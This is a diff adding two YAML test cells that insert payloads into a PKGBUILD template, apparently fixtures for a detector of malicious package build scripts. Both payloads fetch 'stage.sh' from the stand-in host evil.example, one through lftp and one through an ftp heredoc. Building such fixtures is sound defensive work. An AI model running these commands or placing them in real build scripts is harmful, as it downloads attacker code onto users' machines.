@@ -1,0 +1,14 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+        lftp -u u,p -e "get stage.sh; bye" evil.example
+  id: 017-lftp-e-plain-host
+- vars:
+    payload: |2
+        ftp -n -p evil.example <<EOF
+      user u p
+      get stage.sh
+      bye
+      EOF
+  id: 018-ftp-heredoc-opt
